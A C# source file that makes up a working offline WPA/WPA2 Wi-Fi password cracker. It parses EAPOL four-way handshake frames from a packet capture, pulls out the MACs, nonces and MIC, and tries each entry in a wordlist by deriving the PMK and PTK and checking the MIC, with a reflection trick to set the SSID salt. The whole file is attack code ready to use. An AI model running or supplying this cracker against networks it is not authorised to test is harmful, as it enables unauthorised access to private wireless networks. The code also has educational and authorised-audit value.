using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using PcapDotNet.Core;
using PcapDotNet.Packets;
using System.Security.Cryptography;
using System.IO;

namespace CrackingWPA_WPA2
{
    class Program
    {
        static List<Packet> fourWayHandShake = new List<Packet>();
        static void Main(string[] args)
        {
            List<string> wordlis = LoadWordList();


            // Create the offline device
            OfflinePacketDevice selectedDevice = new OfflinePacketDevice("03.cap");

            // Open the capture file
            using (PacketCommunicator communicator =
                selectedDevice.Open(65536,                                  // portion of the packet to capture
                                                                            // 65536 guarantees that the whole packet will be captured on all the link layers
                                    PacketDeviceOpenAttributes.Promiscuous, // promiscuous mode
                                    1000))                                  // read timeout
            {
                // Read and dispatch packets until EOF is reached
                communicator.ReceivePackets(0, DispatcherHandler);
            }

            byte[] apMac = GetPortion(fourWayHandShake[0], 4, 6);
            byte[] stMac = GetPortion(fourWayHandShake[0], 10, 6);
            byte[] aNonce = GetPortion(fourWayHandShake[0], 51, 32);
            byte[] sNonce = GetPortion(fourWayHandShake[1], 51, 32);
            byte[] mic = GetPortion(fourWayHandShake[1], 115, 16);
            byte[] eapol = GetPortion(fourWayHandShake[1], 34, fourWayHandShake[1].Length - 34);

            for (int i = eapol.Length - 40; i < eapol.Length - 40 + 16; i++)
                eapol[i] = 0;

            bool isFind = false;
            foreach (var pass in wordlis)
            {
                Console.WriteLine(pass);
                byte[] pmk = CalculatePMK(Encoding.ASCII.GetBytes(pass), Encoding.ASCII.GetBytes("k_and_s"));
                byte[] ptk = CalculatePTK(pmk, stMac, apMac, sNonce, aNonce);
                if (PtkIsValid(ptk, eapol, mic))
                {
                    Console.WriteLine("Key Found ({0})", pass);
                    isFind = true;
                    break;
                }
            }

            if(!isFind)
                Console.WriteLine("Key Not Found");

        }

        private static void DispatcherHandler(Packet packet)
        {
            if (packet.Length > 33 && packet[32].ToString("x2") == "88" && packet[33].ToString("x2") == "8e")
            {
                fourWayHandShake.Add(packet);

            }
        }

        private static List<string> LoadWordList()
        {
            StreamReader sr = new StreamReader("wordlist.txt");
            List<string> wordlist = new List<string>();

            while (!sr.EndOfStream)
            {
                wordlist.Add(sr.ReadLine());
            }
            return wordlist;
        }

        private static void print(Packet packet)
        {
            // print packet timestamp and packet length
            Console.WriteLine(packet.Timestamp.ToString("yyyy-MM-dd hh:mm:ss.fff") + " length:" + packet.Length);
            Console.WriteLine("length = " + packet.Ethernet.PayloadLength);

            // Print the packet
            const int LineLength = 16;
            for (int i = 0; i != packet.Length; ++i)
            {

                Console.Write((packet[i]).ToString("x2"));
                if ((i + 1) % LineLength == 0)
                    Console.WriteLine();
            }

            Console.WriteLine();
            Console.WriteLine();
        }

        private static byte[] GetPortion(Packet packet, int offset, int count)
        {
            byte[] subArray = packet.ToArray().Subsegment(offset, count).ToArray();
            return subArray;
        }

        public static byte[] CalculatePMK(byte[] psk, byte[] ssid, int pmkLength = 32)

        {

            Rfc2898DeriveBytes pbkdf2 = new Rfc2898DeriveBytes(psk, /*ssid*/ new byte[8], 4096);

            //This reflection is required because there's an arbitrary restriction that the salt must be at least 8 bytes

            var saltProp = pbkdf2.GetType().GetField("m_salt", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Instance);

            saltProp.SetValue(pbkdf2, ssid);

            //pbkdf2.Reset(); 

            //To officially complete the reflection trick, the private method Initialize() should be called. That's all Reset() does. 

            //But I don't think it's needed because we haven't hashed anything yet.

            return pbkdf2.GetBytes(pmkLength);

        }

        public static byte[] CalculatePTK(byte[] pmk, byte[] stmac, byte[] bssid, byte[] snonce, byte[] anonce)
        {
            var pke = new byte[100];
            var ptk = new byte[80];

            using (var ms = new System.IO.MemoryStream(pke))
            {
                using (var bw = new System.IO.BinaryWriter(ms))
                {
                    bw.Write(new byte[] { 0x50, 0x61, 0x69, 0x72, 0x77, 0x69, 0x73, 0x65, 0x20, 0x6b, 0x65, 0x79, 0x20, 0x65, 0x78, 0x70, 0x61, 0x6e, 0x73, 0x69, 0x6f, 0x6e, 0 });/* Literally the string Pairwise key expansion, with a trailing 0*/

                    if (memcmp(stmac, bssid) < 0)
                    {
                        bw.Write(stmac);
                        bw.Write(bssid);
                    }
                    else
                    {
                        bw.Write(bssid);
                        bw.Write(stmac);
                    }

                    if (memcmp(snonce, anonce) < 0)
                    {
                        bw.Write(snonce);
                        bw.Write(anonce);
                    }
                    else
                    {
                        bw.Write(anonce);
                        bw.Write(snonce);
                    }

                    bw.Write((byte)0); // Will be swapped out on each round in the loop below
                }
            }

            for (byte i = 0; i < 4; i++)
            {
                pke[99] = i;
                var hmacsha1 = new HMACSHA1(pmk);
                hmacsha1.ComputeHash(pke);
                hmacsha1.Hash.CopyTo(ptk, i * 20);
            }
            return ptk;
        }


        private static int memcmp(byte[] b1, byte[] b2)
        {
            for (int i = 0; i < b1.Length; i++)
            {
                if (b1[i] != b2[i])
                {
                    if ((b1[i] >= 0 && b2[i] >= 0) || (b1[i] < 0 && b2[i] < 0))
                        return b1[i] - b2[i];
                    if (b1[i] < 0 && b2[i] >= 0)
                        return 1;
                    if (b2[i] < 0 && b1[i] >= 0)
                        return -1;
                }
            }
            return 0;

        }

        public static bool PtkIsValid(byte[] ptk, byte[] eapol, byte[] mic)
        {

            var hmacsha1 = new HMACSHA1(ptk.Take(16).ToArray());
            hmacsha1.ComputeHash(eapol);
            bool isValid = hmacsha1.Hash.Take(16).SequenceEqual(mic);

            return isValid;
        }


    }
}
